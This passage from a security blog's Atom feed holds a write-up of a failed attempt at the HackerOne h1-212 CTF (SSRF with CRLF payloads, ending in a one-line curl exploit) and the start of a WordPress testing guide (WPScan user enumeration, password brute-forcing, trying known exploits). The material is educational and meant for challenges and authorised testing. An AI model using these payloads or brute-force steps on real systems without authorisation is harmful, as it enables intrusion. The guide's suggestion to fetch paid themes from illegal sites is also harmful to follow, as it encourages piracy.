+While &lt;code class=&quot;highlighter-rouge&quot;&gt;/index.html&lt;/code&gt; is the default Apache index page, &lt;code class=&quot;highlighter-rouge&quot;&gt;/icons/README&lt;/code&gt; the default Apache icons list and of course it would be too easy if this &lt;code class=&quot;highlighter-rouge&quot;&gt;/flag&lt;/code&gt; file would be the good one…&lt;br /&gt;
+&lt;a href=&quot;/images/ctf-h1-212-fake-flag.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-fake-flag.png&quot; alt=&quot;ctf h1-212 fake flag&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;At the same time I ran a Nmap scan on all TCP ports and top 500 UDP. This result to only two open ports: 22 and 80.
+I quickly tried a brute force against SSH with Patator but it failed.&lt;/p&gt;
+
+&lt;p&gt;I then decided to use Burp Suite to try another type of issue called &lt;code class=&quot;highlighter-rouge&quot;&gt;Virtual Host Enumeration&lt;/code&gt;.
+I jumped on this because I recently read an article about that and I also sent a similar report to a private program a week before. Since the brilliant engineer works for &lt;code class=&quot;highlighter-rouge&quot;&gt;acme.org&lt;/code&gt;, I configured the attack for this domain.
+And it found something interesting at &lt;code class=&quot;highlighter-rouge&quot;&gt;admin.acme.org&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/ctf-h1-212-host-attack.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-host-attack.png&quot; alt=&quot;ctf h1-212 host attack&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Resources:&lt;/strong&gt;&lt;br /&gt;
+&lt;a href=&quot;https://blog.securitybreached.org/2017/11/04/access-localhost-via-virtual-host-virtual-host-enumeration/&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Accessing Localhost via Vhost | VIRTUAL HOST ENUMERATION&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/jobertabma/virtual-host-discovery&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Jobert tool: virtual host scanner&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/gwen001/vhost-brute&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;vhost-brute: a PHP tool I wrote right after the CTF&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;step-2-bargain-with-the-server&quot;&gt;Step 2, bargain with the server&lt;/h2&gt;
+
+&lt;p&gt;I was supposed to have access to an hidden admin now so what’s next ? Let’s check the response of the server:
+&lt;a href=&quot;/images/ctf-h1-212-host-found.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-host-found.png&quot; alt=&quot;ctf h1-212 host found&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Looks like we have a cookie to play with! Obviously the first thing you would try is to change the value from &lt;code class=&quot;highlighter-rouge&quot;&gt;admin=no&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;admin=yes&lt;/code&gt;…
+Here we go, and the new response is:&lt;br /&gt;
+&lt;a href=&quot;/images/ctf-h1-212-admin-yes.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-admin-yes.png&quot; alt=&quot;ctf h1-212 admin yes&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The message is clear enough, the &lt;code class=&quot;highlighter-rouge&quot;&gt;GET&lt;/code&gt; method is not allowed, so switching to &lt;code class=&quot;highlighter-rouge&quot;&gt;POST&lt;/code&gt; would return:&lt;br /&gt;
+&lt;a href=&quot;/images/ctf-h1-212-method-post.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-method-post.png&quot; alt=&quot;ctf h1-212 method post&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;According to the official documentation, aka Wikipedia xD&lt;br /&gt;
+&lt;em&gt;“&lt;strong&gt;406 Not Acceptable&lt;/strong&gt;:
+The requested resource is capable of generating only content not acceptable according to the Accept headers sent in the request.”&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok then… Altering the header &lt;code class=&quot;highlighter-rouge&quot;&gt;Accept&lt;/code&gt; will not change anything, however if I also change the &lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; in the request…&lt;br /&gt;
+&lt;a href=&quot;/images/ctf-h1-212-content-type-json.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-content-type-json.png&quot; alt=&quot;ctf h1-212 content type json&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Server says that I am supposed to provide a body now, let’s say parameters, in JSON format. Since I have no idea about the name of the parameters, I supplied an empty string:&lt;br /&gt;
+&lt;a href=&quot;/images/ctf-h1-212-body-param.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-body-param.png&quot; alt=&quot;ctf h1-212 body param&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The server requires a &lt;code class=&quot;highlighter-rouge&quot;&gt;domain&lt;/code&gt; so let’s feed him with that! I won’t show you all the errors returned by the server (&lt;code class=&quot;highlighter-rouge&quot;&gt;.com&lt;/code&gt; required, &lt;code class=&quot;highlighter-rouge&quot;&gt;212&lt;/code&gt; required etc…) but here is the final string I got:&lt;br /&gt;
+&lt;a href=&quot;/images/ctf-h1-212-good-domain.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-good-domain.png&quot; alt=&quot;ctf h1-212 good domain&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Resources:&lt;/strong&gt;&lt;br /&gt;
+&lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_HTTP_status_codes&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;List of HTTP status codes&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;step-3-start-crying-12&quot;&gt;Step 3, start crying 1/2&lt;/h2&gt;
+
+&lt;p&gt;At this point here is the request I had:&lt;br /&gt;
+&lt;a href=&quot;/images/ctf-h1-212-read-php.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-read-php.png&quot; alt=&quot;ctf h1-212 read php&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;I firstly tried SQLi by injecting single quote, double quotes, encoded values, using SQLmap blablabla, nothing.&lt;br /&gt;
+I then tried XSS by injecting single quote, double quotes, less-than symbol, encoded values again and still nothing.&lt;br /&gt;
+I tried Local File Inclusion with Jhaddix worlists, nothing.&lt;br /&gt;
+I also tried to inject extra parameters and extra headers as well, nothing.&lt;br /&gt;
+I had a hard time to find the next step, I stayed stuck here 1 full day, trying figure out what kind of attack would work.&lt;/p&gt;
+
+&lt;p&gt;After a night break, I read a comment from another hacker that had scripted the 2 requests to be able to run them automatically in a row. 
+At this moment I understood that there was probably a link between the POST request and the result of &lt;code class=&quot;highlighter-rouge&quot;&gt;read.php&lt;/code&gt;.
+To be honest I would not had realize that by myself.
+I simply thought that the previous step was done and jumped to the next one without even thinking there could be a relation… errrrrr that was my first mistake.&lt;/p&gt;
+
+&lt;p&gt;So I did it too. I PHP curly scripted the requests, and from here I only used my script to find the flag, that was my second mistake, this is probably the reason why I didn’t get it.&lt;/p&gt;
+
+&lt;p&gt;So basically, altering the &lt;code class=&quot;highlighter-rouge&quot;&gt;domain&lt;/code&gt; provided in the JSON param in the body of the POST request would lead to a different response when calling &lt;code class=&quot;highlighter-rouge&quot;&gt;read.php&lt;/code&gt; with the corresponding &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt; returned by the server.
+After playing a little bit with the value, injecting stupid characters and so on, I finally was able to retrieve datas and I quickly realized that I was in front of a SSRF issue.&lt;br /&gt;
+&lt;a href=&quot;/images/ctf-h1-212-ssrf-80.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-ssrf-80.png&quot; alt=&quot;ctf h1-212 ssrf 80&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The final response is the base64 encoded result of the HTTP request performed by the server. In this case: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://localhost:80/index.html&lt;/code&gt; the default Apache page.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Important note:&lt;/strong&gt; at each HTTP POST request performed by the server, &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt; is incremented by 1. 
+Sometimes it get back to 0 but I didn’t figure out why/when/how. It doesn’t seem to be shared between the hackers.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-3-or-4-or-5-port-scanning&quot;&gt;Step 3’ or 4 or 5, port scanning&lt;/h2&gt;
+
+&lt;p&gt;I’m pretty sure that this step was supposed to be the last one but when I’m able to trigger a SSRF issue, I always perform a port scan first.&lt;/p&gt;
+
+&lt;p&gt;I simply moved my 2 curl requests into a &lt;code class=&quot;highlighter-rouge&quot;&gt;for&lt;/code&gt; loop that iterates from 1 to 65535, because why not ?
+Ok, Jobert said that brute force is not the key but you know… I’m still a kid in my mind, I’m a geek, I’m a hacker so… 
+when someone tell me to NOT do something, then I feel really bad if I don’t give it a single try!&lt;/p&gt;
+
+&lt;p&gt;After few minutes and some false positive, my script displayed a different response corresponding to the port &lt;code class=&quot;highlighter-rouge&quot;&gt;1337&lt;/code&gt;:&lt;br /&gt;
+&lt;a href=&quot;/images/ctf-h1-212-ssrf-1337.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-ssrf-1337.png&quot; alt=&quot;ctf h1-212 ssrf 1337&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Confirmed with Burp:
+&lt;a href=&quot;/images/ctf-h1-212-ssrf-1337-burp.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-ssrf-1337-burp.png&quot; alt=&quot;ctf h1-212 ssrf 1337 burp&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Easy peasy.&lt;br /&gt;
+I was pretty sure this was the key so I stopped my script at port 19187, enough spam.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Resources:&lt;/strong&gt;&lt;br /&gt;
+&lt;a href=&quot;https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Hackerone article about SSRF&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Server-side browsing considered harmful by Nicolas Grégoire&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;step-x-try-harder-cry-stronger-22&quot;&gt;Step x, try harder, cry stronger 2/2&lt;/h2&gt;
+
+&lt;p&gt;Ok I have the good parameter, a good domain, good Content-Type, good cookie, the l33t port, I can decode base64, so far so good!
+Now I simply need to request a single file like &lt;code class=&quot;highlighter-rouge&quot;&gt;/index.html&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;/flag&lt;/code&gt;, that would be great!
+Hopefully this is the final step. Unfortunately this is where things gone wrong :/&lt;/p&gt;
+
+&lt;p&gt;I read many documentation and articles about SSRF but the most useful was the SSRF bible and the presentation from Orange Tsai. Simply awesome.
+The idea: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://1.1.1.1 &amp;amp;@2.2.2.2# @3.3.3.3/&lt;/code&gt;&lt;br /&gt;
+Since &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;%&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;#&lt;/code&gt; are forbidden characters in this challenge, from this two papers I understood that I should combine the SSRF with a CRLF.
+Dealing with &lt;code class=&quot;highlighter-rouge&quot;&gt;\r&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;\n&lt;/code&gt; I quickly got a strange behavior:&lt;br /&gt;
+&lt;a href=&quot;/images/ctf-h1-212-ssrf-1337-400.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-ssrf-1337-400.png&quot; alt=&quot;ctf h1-212 ssrf 1337 400&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Yes, yes, yes, it’s not Apache anymore, I am now dealing with a Nginx install.
+Does it matter ? Well I don’t know, maybe those servers don’t react to CRLF the same way…&lt;/p&gt;
+
+&lt;p&gt;Since the first part of the domain must contain &lt;code class=&quot;highlighter-rouge&quot;&gt;212&lt;/code&gt; and the last part must end by &lt;code class=&quot;highlighter-rouge&quot;&gt;.com&lt;/code&gt;, I had configure a dns &lt;code class=&quot;highlighter-rouge&quot;&gt;A&lt;/code&gt; record of my own domain to point to &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt;, that was useless but hey, how could I know!
+Based on the “3 parts payload” mentionned by Orange Tsai, here are some stuff I tried:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;poc212.10degres.net:1337/flag @www.google.com @h1-212.acme.com
+poc212.10degres.net:1337/\r @www.google.com\r @h1-212.acme.com
+poc212.10degres.net:1337\r\t@www.google.com\r\t@h1-212.acme.com
+poc212.10degres.net:1337\s@www.google.com\s@h1-212.acme.com
+poc212.10degres.net:1337\r\n@www.google.com\r\n@h1-212.acme.com
+poc212.10degres.net:1337 @\r\nwww.google.com @\r\nh1-212.acme.com
+poc212.10degres.net:1337 @/flag @h1-212.acme.com
+poc212.10degres.net:1337 @www.google.com @/h1-212.acme.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;After some hours (…) I decided to use the SSRF against my own server, that way I could see what kind of requests the CTF server send.
+Installing and configuring Nginx. Configuring a &lt;code class=&quot;highlighter-rouge&quot;&gt;.com&lt;/code&gt; domain I have and the vhost that will be accepted by Jobert’s code as well.
+Same same but different:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;poc212.10degres.net:1337/flag @www.google.com @h1-212.10degres.com
+poc212.10degres.net:1337/\r @www.google.com\r @h1-212.10degres.com
+poc212.10degres.net:1337\r\t@www.google.com\r\t@h1-212.10degres.com
+poc212.10degres.net:1337\s@www.google.com\s@h1-212.10degres.com
+poc212.10degres.net:1337\r\n@www.google.com\r\n@h1-212.10degres.com
+poc212.10degres.net:1337 @\r\nwww.google.com @\r\nh1-212.10degres.com
+poc212.10degres.net:1337 @/flag @h1-212.10degres.com
+poc212.10degres.net:1337 @www.google.com @/h1-212.10degres.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Checking the log, again and again and still got this f*****g error 400:
+&lt;a href=&quot;/images/ctf-h1-212-nginx-400.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-nginx-400.png&quot; alt=&quot;ctf h1-212 nginx 400&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Better use Netcat to see the headers received:&lt;br /&gt;
+&lt;a href=&quot;/images/ctf-h1-212-netcat-400.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-netcat-400.png&quot; alt=&quot;ctf h1-212 netcat 400&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Well not so much information here… Let’s try with tcdump then:
+&lt;a href=&quot;/images/ctf-h1-212-tcpdump.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-tcpdump.png&quot; alt=&quot;ctf h1-212 tcpdump&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Still nothing… Let’s try something a bit more tricky. What about CRLF combined with header injection ?
+My new payload looked like:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;poc212.10degres.net:1337/flag HTTP/1.0\rHost: admin.acme.org\rCookie: admin=yes\r @h1-212.10degres.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/ctf-h1-212-header-injection.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-header-injection.png&quot; alt=&quot;ctf h1-212 header injection&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Hey but what about encoding ? Yeah yeah yeah I tried that too, since &lt;code class=&quot;highlighter-rouge&quot;&gt;%&lt;/code&gt; is not allowed, I had to try something else:
+&lt;code class=&quot;highlighter-rouge&quot;&gt;\x0A&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0A&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;\u000A&lt;/code&gt; and the whole family, of course it didn’t work…&lt;/p&gt;
+
+&lt;p&gt;At the end of the day, the great &lt;a href=&quot;https://twitter.com/EdOverflow&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;@EdOverflow&lt;/a&gt; gave me a hint, &lt;em&gt;kudos&lt;/em&gt; to him.
+He told me that I have gone too far with header injection, the solution was much simpler, I should focus on the first part of the payload.
+That said, after a full day on this shit (and some violent outrage against Jobert ^^), I gave up for a good night.&lt;/p&gt;
+
+&lt;p&gt;Next day, let’s recap what I learned the day before:
+the first part and the third part of the three part payload (found in Orange Tsai doc) are injectable and trigger the SSRF to a domain I can control and depending of the characters I use for the CRLF (&lt;code class=&quot;highlighter-rouge&quot;&gt;\t&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;\s&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;\r&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;\s&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;\b&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;💩&lt;/code&gt;)  the server acts different, which seems to be logic…&lt;/p&gt;
+
+&lt;p&gt;Ok! New payloads on the way:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:1337/flag\r\nh1-212.10degres.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;No more luck, I continued to alter it with different characters, different encoding.
+I also tried different protocols found in the SSRF bible: http, https, file, gopher, dict, mailto and so on…
+With a good wordlist and a &lt;code class=&quot;highlighter-rouge&quot;&gt;for&lt;/code&gt; loop it was easy to test them all but unfortunately no matter what I tried, my script always returned empty data.&lt;/p&gt;
+
+&lt;p&gt;One more day wasted for nothing, I didn’t move forward :/
+I won’t show you all the payloads I tried, thousands and thousands, the only thing you need to know is that they all failed!
+But the real question is: did they really failed?&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Resources:&lt;/strong&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;PayloadsAllTheThings resources on GitHub&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;SSRF bible&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;http://blog.safebuff.com/2016/07/03/SSRF-Tips/&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;SSRF tips by xl7dev&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! by Orange Tsai&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;the-answer-free-your-mind&quot;&gt;The answer, free your mind…&lt;/h2&gt;
+
+&lt;p&gt;After 5 full days working on the challenge, I finally spent the 2 last days with my childrens, trying to get over the headhash.
+Since the challenge was ended, I decided to ask the answer to &lt;a href=&quot;https://twitter.com/EdOverflow&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;@EdOverflow&lt;/a&gt;, knowing that I would probably cry… and guess what? I did!&lt;/p&gt;
+
+&lt;p&gt;Remember that the &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt; returned by the POST request is incremented by 1 for each request made by the server ?
+But what if I inject a CRLF and the server does 2 requests ? Then the id returned will be incremented by 2, because 1+1=2!
+Holy cow!!!!&lt;/p&gt;
+
+&lt;p&gt;Running my script like a moron, I only focused my mind on the result of &lt;code class=&quot;highlighter-rouge&quot;&gt;/read.php&lt;/code&gt; and I didn’t even notice that the id jump the steps 2 by 2…&lt;br /&gt;
+&lt;a href=&quot;/images/ctf-h1-212-moron.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-moron.png&quot; alt=&quot;ctf h1-212 moron&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;So I need to decrease the id by 1 to get the result of the previous request.
+Which is supposed to be the content of the file I requested aka &lt;code class=&quot;highlighter-rouge&quot;&gt;http://0:1337/flag&lt;/code&gt;.
+&lt;a href=&quot;/images/ctf-h1-212-answer.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/images/ctf-h1-212-answer.png&quot; alt=&quot;ctf h1-212 answer&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Et voilà ! Decoded value:&lt;br /&gt;
+FLAG: CF,2dsV\/]fRAYQ.TDEp`w&quot;M(%mU;p9+………&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;Pay attention to all details, stupid idiot!&lt;/p&gt;
+
+&lt;p&gt;Jobert’s answer in 1 single line:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;D=104.236.20.43/;eval echo $(C=admin=yes;H='Host:http://admin.acme.org ';N=$(curl -H'Content-Type:application/json' -H$H -b$C -d'{&quot;domain&quot;:&quot;0:1337/flag\n212..com&quot;}' &quot;$D&quot;|egrep -o '[0-9]+');curl -H$H -b$C &quot;$D&quot;read.php?id=`expr $N - 1`|jq .[])|base64 --decode
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Winners:&lt;br /&gt;
+&lt;a href=&quot;https://twitter.com/EdOverflow&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;@EdOverflow&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://twitter.com/albinowax&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;@albinowax&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://twitter.com/erbbysam&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;@erbbysam&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Congrats to these 3 people, congrats to all others that successfully got the flag and congrats to everyone that at least gave a try!&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/ctf-h1-212/&quot;&gt;Fail at CTF h1-212 - The Evil Job&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on November 20, 2017.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Wordpress testing]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/wordpress-testing/" />
+  <id>http://10degres.net/wordpress-testing</id>
+  <published>2017-09-12T00:00:00+01:00</published>
+  <updated>2017-09-12T00:00:00+01:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;p&gt;Here is the way I usually follow to test a Wordpress install.&lt;/p&gt;
+
+&lt;h2 id=&quot;information-gathering&quot;&gt;Information gathering&lt;/h2&gt;
+
+&lt;p&gt;Get basic informations with &lt;a href=&quot;https://wpscan.org/&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;WPScan&lt;/a&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wpscan -r --enumerate u --url http://www.example.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;If it can’t retrieve the user list, try to use provided script &lt;code class=&quot;highlighter-rouge&quot;&gt;stop_user_enumeration_bypass.rb&lt;/code&gt;
+For each user found, try to brute with basic passwords:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wpscan -r --url http://www.example.com --wordlist /Wordlists/Passwords/best1050.txt --username &amp;lt;username&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;If the version of Wordpress has been found, download it from the official archive directory:
+&lt;a href=&quot;https://wordpress.org/download/release-archive/&quot; target=&quot;_blank&quot;&gt;https://wordpress.org/download/release-archive/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Open the tested website and take a look at the source to find those strings:
+&lt;code class=&quot;highlighter-rouge&quot;&gt;wp-content/themes&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;wp-content/plugins&lt;/code&gt;
+This could reveal more themes/plugins.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h2 id=&quot;replication&quot;&gt;Replication&lt;/h2&gt;
+
+&lt;p&gt;For each themes found, download them from the official archive directory:
+&lt;a href=&quot;https://wordpress.org/themes/&quot; target=&quot;_blank&quot;&gt;https://wordpress.org/themes/&lt;/a&gt;&lt;br /&gt;
+Try to download the exact same version from the SVN repository (ex: &lt;a href=&quot;https://themes.svn.wordpress.org/matala/&quot; target=&quot;_blank&quot;&gt;https://themes.svn.wordpress.org/matala/&lt;/a&gt;)&lt;br /&gt;
+If you can’t find it, try to download the version before and after.
+If the theme can’t be found or if it’s not free, try to find it from Google or on some illegal website (take care of backdoors).&lt;/p&gt;
+
+&lt;p&gt;For each plugins found, download them from the official archive directory:
+&lt;a href=&quot;https://wordpress.org/plugins/&quot; target=&quot;_blank&quot;&gt;https://wordpress.org/plugins/&lt;/a&gt;&lt;br /&gt;
+Try to download the exact same version from the Trac browser (ex: &lt;a href=&quot;https://plugins.trac.wordpress.org/browser/anual-archive/&quot; target=&quot;_blank&quot;&gt;https://themes.svn.wordpress.org/matala/&lt;/a&gt;)&lt;br /&gt;
+If you can’t find it, try to download the version before and after.
+If the plugin can’t be found or if it’s not free, try to find it from Google or on some illegal website (take care of backdoors).&lt;/p&gt;
+
+&lt;p&gt;Once you have everything, open you local dashboard of your local install, and enable all themes and plugins you have downloaded.&lt;/p&gt;
+
+&lt;h2 id=&quot;find-an-exploit-the-easy-way&quot;&gt;Find an exploit, the easy way&lt;/h2&gt;
+
+&lt;p&gt;For each themes and plugins found, check on &lt;a href=&quot;https://www.exploit-db.com/&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Exploit Database&lt;/a&gt; if there is an existing exploit:&lt;br /&gt;
+&lt;a href=&quot;/images/wordpress-exploitdb.png&quot;&gt;&lt;img src=&quot;/images/wordpress-exploitdb.png&quot; alt=&quot;wordpress exploitdb&quot; /&gt;&lt;/a&gt;&lt;br /&gt;
+If yes, try them all.&lt;/p&gt;
+
+&lt;h2 id=&quot;low-hanging-fruits&quot;&gt;Low hanging fruits&lt;/h2&gt;
+
+&lt;p&gt;Open a terminal and find all files you’ve got with the themes and the plugins:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find &amp;lt;your_install_path&amp;gt;/wp-content/themes/ -type f
+find &amp;lt;your_install_path&amp;gt;/wp-content/plugins/ -type f
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Save the result in a file and inject in Burp Intruder on your target. Check the response code, this will give you a good idea if you have downloaded the right things or not (you should get a lot of 200).&lt;/p&gt;
+
+&lt;p&gt;Check twice the result of PHP files, this could reveal a Full Path Disclosure:
+&lt;a href=&quot;/images/wordpress-fpd.png&quot;&gt;&lt;img src=&quot;/images/wordpress-fpd.png&quot; alt=&quot;wordpress full path disclosure&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;If you don’t get anything, retry with all PHP files, even the Wordpress core.
+Most of the time WPScan will detect it but it’s worth the hit to try!&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find &amp;lt;your_install_path&amp;gt; -type f -name &quot;*.php&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
